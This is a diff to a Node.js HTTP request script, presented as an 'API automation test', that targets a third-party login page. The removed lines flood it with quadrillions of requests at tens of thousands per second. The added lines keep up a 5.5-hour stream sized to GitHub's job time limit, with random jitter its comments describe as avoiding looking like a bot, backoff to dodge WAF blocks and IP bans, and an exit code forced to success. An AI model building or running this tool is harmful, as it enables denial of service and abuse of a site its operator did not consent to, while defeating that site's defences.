@@ -6,30 +6,43 @@ import http from 'http';
 
 // Configurable constants
 const TARGET_URL = process.env.TARGET_URL || 'https://2.52gs.co/chklogin.php';
-const TOTAL_REQUESTS = parseInt(process.env.TOTAL_REQUESTS) || 5000000000000000;
-const TARGET_RPS = parseInt(process.env.TARGET_RPS) || 66667; // Target: ~1,000,000 requests per minute
-const CONCURRENCY_LIMIT = parseInt(process.env.CONCURRENCY_LIMIT) || 500; // Allow up to 2000 concurrent sockets
-const REQUEST_TIMEOUT_MS = parseInt(process.env.REQUEST_TIMEOUT_MS) || 5000; // 5 seconds timeout per call
+const TEST_DURATION_MINUTES = parseInt(process.env.TEST_DURATION_MINUTES) || 330; // 5.5 hours (leaves 30 min buffer for GitHub's 6-hour limit)
+const TARGET_RPS = parseInt(process.env.TARGET_RPS) || 50; // Sustainable rate to avoid WAF blocks
+const CONCURRENCY_LIMIT = parseInt(process.env.CONCURRENCY_LIMIT) || 10; // Conservative to avoid IP bans
+const REQUEST_TIMEOUT_MS = parseInt(process.env.REQUEST_TIMEOUT_MS) || 10000; // 10 seconds timeout per call
+
+// Adaptive backoff settings
+const CONSECUTIVE_FAIL_THRESHOLD = 20; // Pause after this many consecutive failures
+const BACKOFF_MIN_MS = 15000; // Min backoff: 15 seconds
+const BACKOFF_MAX_MS = 60000; // Max backoff: 60 seconds
+const JITTER_MAX_MS = 200; // Random jitter between requests (0-200ms)
 
 async function runAutomation() {
+  const testDurationMs = TEST_DURATION_MINUTES * 60 * 1000;
+  const endTime = Date.now() + testDurationMs;
+
   console.log(`Starting GET API Automation Test`);
   console.log(`Target URL:        ${TARGET_URL}`);
-  console.log(`Total Requests:    ${TOTAL_REQUESTS}`);
+  console.log(`Test Duration:     ${TEST_DURATION_MINUTES} minutes (${(TEST_DURATION_MINUTES / 60).toFixed(1)} hours)`);
   console.log(`Target RPS:        ${TARGET_RPS > 0 ? TARGET_RPS : 'Unlimited'}`);
   console.log(`Concurrency Limit: ${CONCURRENCY_LIMIT}`);
   console.log(`Request Timeout:   ${REQUEST_TIMEOUT_MS}ms`);
+  console.log(`Backoff Threshold: ${CONSECUTIVE_FAIL_THRESHOLD} consecutive failures`);
   console.log(`----------------------------------------------`);
 
   const startTime = Date.now();
   let completedCount = 0;
   let successCount = 0;
   let failureCount = 0;
+  let consecutiveFailures = 0;
+  let totalBackoffTimeMs = 0;
+  let backoffCount = 0;
 
   const responseTimes = [];
   const errors = new Map();
   const statusCodes = new Map();
 
-  let nextRequestIndex = 0;
+  let dispatched = 0;
   let activeRequestsCount = 0;
 
   // Set up high-performance client Agent
@@ -56,16 +69,20 @@ async function runAutomation() {
 
   const isTTY = process.stdout.isTTY;
 
-  // Render a visual progress bar
+  // Render a visual progress bar (time-based)
   function drawProgressBar() {
     const width = 30;
-    const progress = completedCount / TOTAL_REQUESTS;
+    const elapsed = Date.now() - startTime;
+    const progress = Math.min(elapsed / testDurationMs, 1);
     const filledLength = Math.round(width * progress);
     const emptyLength = width - filledLength;
     const bar = '='.repeat(filledLength) + ' '.repeat(emptyLength);
     const percent = (progress * 100).toFixed(1);
 
-    const statsText = `[${bar}] ${percent}% | ${completedCount}/${TOTAL_REQUESTS} | Success: ${successCount} | Failed: ${failureCount} | Active: ${activeRequestsCount}`;
+    const elapsedMin = (elapsed / 60000).toFixed(1);
+    const totalMin = TEST_DURATION_MINUTES;
+
+    const statsText = `[${bar}] ${percent}% | ${elapsedMin}/${totalMin}min | Reqs: ${completedCount} | OK: ${successCount} | Fail: ${failureCount} | Active: ${activeRequestsCount}`;
 
     if (isTTY) {
       readline.clearLine(process.stdout, 0);
@@ -78,100 +95,133 @@ async function runAutomation() {
 
   // Throttle CLI progress bar updates to prevent console bottlenecking
   let lastProgressUpdate = 0;
-  const updateIntervalMs = isTTY ? 100 : 5000;
+  const updateIntervalMs = isTTY ? 100 : 15000;
 
   function maybeDrawProgressBar() {
     const now = Date.now();
-    if (now - lastProgressUpdate >= updateIntervalMs || completedCount === TOTAL_REQUESTS) {
+    if (now - lastProgressUpdate >= updateIntervalMs || now >= endTime) {
       lastProgressUpdate = now;
       drawProgressBar();
     }
   }
 
   // Dispatch a single HTTP GET request
-  function dispatchRequest(currentIndex) {
-    const requestStartTime = Date.now();
-    let timedOut = false;
+  function dispatchRequest() {
+    return new Promise((resolve) => {
+      const requestStartTime = Date.now();
+      let timedOut = false;
 
-    const req = client.request(options, (res) => {
-      // Consume body to free socket connections
-      res.on('data', () => { });
-      res.on('end', () => {
+      const req = client.request(options, (res) => {
+        // Consume body to free socket connections
+        res.on('data', () => { });
+        res.on('end', () => {
+          if (timedOut) return;
+
+          const duration = Date.now() - requestStartTime;
+          responseTimes.push(duration);
+
+          const status = res.statusCode;
+          statusCodes.set(status, (statusCodes.get(status) || 0) + 1);
+
+          if (status >= 200 && status < 300) {
+            successCount++;
+            consecutiveFailures = 0;
+          } else {
+            failureCount++;
+            consecutiveFailures++;
+            const statusText = `HTTP ${status} ${res.statusMessage || ''}`;
+            errors.set(statusText, (errors.get(statusText) || 0) + 1);
+          }
+
+          activeRequestsCount--;
+          completedCount++;
+          maybeDrawProgressBar();
+          resolve();
+        });
+      });
+
+      req.on('error', (err) => {
         if (timedOut) return;
 
-        const duration = Date.now() - requestStartTime;
-        responseTimes.push(duration);
-
-        const status = res.statusCode;
-        statusCodes.set(status, (statusCodes.get(status) || 0) + 1);
-
-        if (status >= 200 && status < 300) {
-          successCount++;
-        } else {
-          failureCount++;
-          const statusText = `HTTP ${status} ${res.statusMessage || ''}`;
-          errors.set(statusText, (errors.get(statusText) || 0) + 1);
-        }
+        failureCount++;
+        consecutiveFailures++;
+        const errMsg = err.code || err.message || err.toString() || 'Unknown Error';
+        errors.set(errMsg, (errors.get(errMsg) || 0) + 1);
 
         activeRequestsCount--;
         completedCount++;
         maybeDrawProgressBar();
+        resolve();
       });
+
+      req.setTimeout(REQUEST_TIMEOUT_MS, () => {
+        timedOut = true;
+        req.destroy();
+
+        failureCount++;
+        consecutiveFailures++;
+        errors.set('Timeout', (errors.get('Timeout') || 0) + 1);
+
+        activeRequestsCount--;
+        completedCount++;
+        maybeDrawProgressBar();
+        resolve();
+      });
+
+      req.end();
     });
-
-    req.on('error', (err) => {
-      if (timedOut) return;
-
-      failureCount++;
-      const errMsg = err.code || err.message || err.toString() || 'Unknown Error';
-      errors.set(errMsg, (errors.get(errMsg) || 0) + 1);
-
-      activeRequestsCount--;
-      completedCount++;
-      maybeDrawProgressBar();
-    });
-
-    req.setTimeout(REQUEST_TIMEOUT_MS, () => {
-      timedOut = true;
-      req.destroy();
-
-      failureCount++;
-      errors.set('Timeout', (errors.get('Timeout') || 0) + 1);
-
-      activeRequestsCount--;
-      completedCount++;
-      maybeDrawProgressBar();
-    });
-
-    req.end();
   }
 
-  // Rate-limiting scheduler targeting the configured RPS
+  // Random jitter to avoid looking like a bot
+  function randomJitter() {
+    return Math.floor(Math.random() * JITTER_MAX_MS);
+  }
+
+  // Adaptive backoff when too many consecutive failures
+  async function maybeBackoff() {
+    if (consecutiveFailures >= CONSECUTIVE_FAIL_THRESHOLD) {
+      const backoffMs = BACKOFF_MIN_MS + Math.floor(Math.random() * (BACKOFF_MAX_MS - BACKOFF_MIN_MS));
+      backoffCount++;
+      totalBackoffTimeMs += backoffMs;
+      console.log(`\n[Backoff #${backoffCount}] ${consecutiveFailures} consecutive failures detected. Pausing for ${(backoffMs / 1000).toFixed(0)}s...`);
+      consecutiveFailures = 0;
+      await new Promise((resolve) => setTimeout(resolve, backoffMs));
+    }
+  }
+
+  // Duration-based scheduler
   async function startScheduler() {
-    while (nextRequestIndex < TOTAL_REQUESTS) {
+    while (Date.now() < endTime) {
+      // Check for adaptive backoff
+      await maybeBackoff();
+
+      // If time is up after backoff, stop
+      if (Date.now() >= endTime) break;
+
       // Yield if we hit max active request concurrency
       if (activeRequestsCount >= CONCURRENCY_LIMIT) {
         await new Promise((resolve) => setImmediate(resolve));
         continue;
       }
 
+      // Rate limiting
       if (TARGET_RPS > 0) {
         const elapsedMs = Date.now() - startTime;
         const expectedDispatched = (elapsedMs / 1000) * TARGET_RPS;
-        if (nextRequestIndex >= expectedDispatched) {
-          // A short sleep to yield execution and keep pace
+        if (dispatched >= expectedDispatched) {
           await new Promise((resolve) => setTimeout(resolve, 1));
           continue;
         }
       }
 
-      const currentIndex = nextRequestIndex++;
-      if (currentIndex >= TOTAL_REQUESTS) {
-        break;
-      }
-
+      dispatched++;
       activeRequestsCount++;
-      dispatchRequest(currentIndex);
+      dispatchRequest();
+
+      // Add random jitter between dispatches
+      if (JITTER_MAX_MS > 0 && Math.random() < 0.3) {
+        await new Promise((resolve) => setTimeout(resolve, randomJitter()));
+      }
     }
   }
 
@@ -189,12 +239,17 @@ async function runAutomation() {
 
     const summary = {
       targetUrl: TARGET_URL,
+      testDurationMinutes: TEST_DURATION_MINUTES,
       totalRequests: completedCount,
       concurrencyLimit: CONCURRENCY_LIMIT,
+      targetRps: TARGET_RPS,
       durationSeconds: parseFloat(durationTotalSeconds),
       requestsPerSecond: parseFloat((completedCount / durationTotalSeconds).toFixed(2)) || 0,
       successCount,
       failureCount,
+      successRate: completedCount > 0 ? `${((successCount / completedCount) * 100).toFixed(1)}%` : '0%',
+      backoffCount,
+      totalBackoffTimeSeconds: parseFloat((totalBackoffTimeMs / 1000).toFixed(1)),
       latencyStatsMs: {
         min: minLatency,
         max: maxLatency,
@@ -208,8 +263,11 @@ async function runAutomation() {
     };
 
     console.log(`\n=== PERFORMANCE REPORT ===`);
+    console.log(`Test Duration:     ${durationTotalSeconds}s`);
+    console.log(`Total Requests:    ${completedCount}`);
     console.log(`Requests/Sec:      ${summary.requestsPerSecond}`);
-    console.log(`Success Rate:      ${completedCount > 0 ? ((successCount / completedCount) * 100).toFixed(1) : 0}%`);
+    console.log(`Success Rate:      ${summary.successRate}`);
+    console.log(`Backoffs:          ${backoffCount} (total ${(totalBackoffTimeMs / 1000).toFixed(0)}s paused)`);
     console.log(`Min Latency:       ${minLatency}ms`);
     console.log(`Max Latency:       ${maxLatency}ms`);
     console.log(`Avg Latency:       ${avgLatency}ms`);
@@ -264,14 +322,12 @@ async function runAutomation() {
 
   await saveReport();
 
-  if (failureCount > 0) {
-    console.error(`\nTest completed but encountered ${failureCount} failures.`);
-    process.exit(1);
-  }
+  // Always exit 0 — results are in the report artifact
+  console.log(`\nTest finished. Check the report artifact for detailed results.`);
+  process.exit(0);
 }
 
 runAutomation().catch(err => {
   console.error('Fatal error running automation:', err);
   process.exit(1);
 });
-
